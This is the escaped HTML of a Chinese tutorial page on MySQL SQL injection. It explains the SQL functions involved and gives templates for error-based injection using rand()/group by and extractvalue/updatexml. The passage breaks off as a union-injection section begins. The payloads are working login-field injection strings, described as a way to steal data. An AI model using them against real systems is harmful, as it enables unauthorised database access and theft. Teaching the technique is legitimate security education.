		&lt;div id=&quot;crayon-587a9554c327f284791344&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
count() 统计元祖的个数（相当于求和）
如select count(*) from information_schema.tables;  

rand()用于产生一个0~1的随机数  

floor()向下取整  

group by 依据我们想要的规矩对结果进行分组  

concat将符合条件的同一列中的不同行数据拼接，以逗号隔开&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327f284791344-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327f284791344-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327f284791344-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327f284791344-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327f284791344-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327f284791344-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327f284791344-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327f284791344-8&quot;&gt;8&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c327f284791344-9&quot;&gt;9&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c327f284791344-10&quot;&gt;10&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327f284791344-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;统计元祖的个数（相当于求和）&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327f284791344-2&quot;&gt;如&lt;span class=&quot;crayon-e&quot;&gt;select &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;from &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327f284791344-3&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327f284791344-4&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;rand&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;用于产生一个&lt;span class=&quot;crayon-cn&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;crayon-o&quot;&gt;~&lt;/span&gt;&lt;span class=&quot;crayon-cn&quot;&gt;1&lt;/span&gt;的随机数&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327f284791344-5&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327f284791344-6&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;floor&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;向下取整&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327f284791344-7&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327f284791344-8&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;group &lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;by&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;依据我们想要的规矩对结果进行分组&lt;span class=&quot;crayon-h&quot;&gt;  &lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c327f284791344-9&quot;&gt; &lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c327f284791344-10&quot;&gt;
&lt;span class=&quot;crayon-i&quot;&gt;concat&lt;/span&gt;将符合条件的同一列中的不同行数据拼接，以逗号隔开&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0013 seconds] --&gt;
&lt;p&gt;&lt;/p&gt;
&lt;h3 id=&quot;用于错误回显的sql语句&quot;&gt;用于错误回显的sql语句&lt;/h3&gt;
&lt;p&gt;&lt;strong&gt;第一种： 基于 rand() 与 group by 的错误&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;利用group by part of rand() returns duplicate key error这个bug，关于rand()函数与group by 在mysql中的错误报告如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;RAND() in a WHERE clause is re-evaluated every time the WHERE is executed.&lt;br&gt;
You cannot use a column with RAND() values in an ORDER BY clause, because ORDER BY would evaluate the column multiple times.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这个bug会爆出duplicate key这个错误，然后顺便就把数据偷到了。&lt;br&gt;
公式：&lt;strong&gt;username=admin’ and (select 1 from (select count(&lt;em&gt;), concat(floor(rand(0)&lt;/em&gt;2),0x23,(你想获取的数据的sql语句))x from information_schema.tables group by x )a) and ‘1’ = ‘1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;第二种： XPATH爆信息&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;这里主要用到的是ExtractValue()和UpdateXML()这2个函数，由于mysql 5.1以后提供了内置的XML文件解析和函数，所以这种注入只能用于5.1版本以后使用&lt;/p&gt;
&lt;p&gt;查看sql手册&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3285847785151&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
语法：EXTRACTVALUE (XML_document, XPath_string);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3285847785151-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3285847785151-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3285847785151-3&quot;&gt;3&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3285847785151-1&quot;&gt;语法：&lt;span class=&quot;crayon-e&quot;&gt;EXTRACTVALUE&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;XML_document&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;XPath_string&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3285847785151-2&quot;&gt;第一个参数：&lt;span class=&quot;crayon-v&quot;&gt;XML&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;document是&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;格式，为&lt;span class=&quot;crayon-i&quot;&gt;XML&lt;/span&gt;文档对象的名称，文中为&lt;span class=&quot;crayon-i&quot;&gt;Doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3285847785151-3&quot;&gt;第二个参数：&lt;span class=&quot;crayon-e&quot;&gt;XPath_string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Xpath&lt;/span&gt;格式的字符串&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;，如果不了解&lt;span class=&quot;crayon-i&quot;&gt;Xpath&lt;/span&gt;语法，可以在网上查找教程。&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0011 seconds] --&gt;
&lt;p&gt;作用：从目标XML中返回包含所查询值的字符串&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3288409876106&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
语法:UPDATEXML (XML_document, XPath_string, new_value);
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3288409876106-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3288409876106-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c3288409876106-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587a9554c3288409876106-4&quot;&gt;4&lt;/div&gt;
&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3288409876106-1&quot;&gt;语法&lt;span class=&quot;crayon-o&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;UPDATEXML&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;XML_document&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;XPath_string&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;new_value&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3288409876106-2&quot;&gt;第一个参数：&lt;span class=&quot;crayon-v&quot;&gt;XML&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;document是&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;格式，为&lt;span class=&quot;crayon-i&quot;&gt;XML&lt;/span&gt;文档对象的名称，文中为&lt;span class=&quot;crayon-i&quot;&gt;Doc&lt;/span&gt;
&lt;/div&gt;
&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c3288409876106-3&quot;&gt;第二个参数：&lt;span class=&quot;crayon-e&quot;&gt;XPath_string&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;crayon-i&quot;&gt;Xpath&lt;/span&gt;格式的字符串&lt;span class=&quot;crayon-sy&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;，如果不了解&lt;span class=&quot;crayon-i&quot;&gt;Xpath&lt;/span&gt;语法，可以在网上查找教程。&lt;/div&gt;
&lt;div class=&quot;crayon-line crayon-striped-line&quot; id=&quot;crayon-587a9554c3288409876106-4&quot;&gt;第三个参数：&lt;span class=&quot;crayon-v&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;_&lt;/span&gt;value，&lt;span class=&quot;crayon-t&quot;&gt;String&lt;/span&gt;格式，替换查找到的符合条件的数据&lt;/div&gt;
&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0015 seconds] --&gt;
&lt;p&gt;作用：改变文档中符合条件的节点的值&lt;/p&gt;
&lt;p&gt;现在就很清楚了，我们只需要不满足XPath_string(Xpath格式)就可以了，但是由于这个方法只能爆出32位，所以可以结合mid来使用&lt;br&gt;
公式1：&lt;strong&gt;username=admin’ and (extractvalue(1, concat(0x7e,(你想获取的数据的sql语句)))) and ‘1’=’1&lt;/strong&gt;&lt;br&gt;
公式2：&lt;strong&gt;username=admin’ and (updatexml(1, concat(0x7e,(你想获取的数据的sql语句)),1)) and ‘1’=’1&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;基于错误回显的注入，总结起来就一句话，通过sql语句的矛盾性来使数据被回显到页面上，但有时候局限于回显只能回显一条，导致基于错误的注入偷数据的效率并没有那么高，但相对于布尔注入已经提高了一个档次。&lt;/p&gt;
&lt;h2 id=&quot;union-query-injection&quot;&gt;union query injection&lt;/h2&gt;
&lt;p&gt;要了解union query injection，首先得了解union查询，union用于合并两个或更多个select的结果集。比如说&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c328b366446917&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-copy-button&quot; title=&quot;复制代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; readonly style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
SELECT username, password FROM account;&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587a9554c328b366446917-1&quot;&gt;1&lt;/div&gt;&lt;/div&gt;
				&lt;/td&gt;
						&lt;td class=&quot;crayon-code&quot;&gt;&lt;div class=&quot;crayon-pre&quot; style=&quot;font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;&quot;&gt;&lt;div class=&quot;crayon-line&quot; id=&quot;crayon-587a9554c328b366446917-1&quot;&gt;
&lt;span class=&quot;crayon-e&quot;&gt;SELECT &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;username&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;crayon-h&quot;&gt; &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;password &lt;/span&gt;&lt;span class=&quot;crayon-e&quot;&gt;FROM &lt;/span&gt;&lt;span class=&quot;crayon-v&quot;&gt;account&lt;/span&gt;&lt;span class=&quot;crayon-sy&quot;&gt;;&lt;/span&gt;
&lt;/div&gt;&lt;/div&gt;&lt;/td&gt;
					&lt;/tr&gt;
				&lt;/table&gt;
			&lt;/div&gt;
		&lt;/div&gt;
&lt;!-- [Format Time: 0.0004 seconds] --&gt;
&lt;p&gt;结果是&lt;/p&gt;
&lt;p&gt;&lt;code&gt;admin 123456&lt;/code&gt;&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587a9554c3290787507913&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-mac print-yes notranslate&quot; data-settings=&quot; minimize scroll-always&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
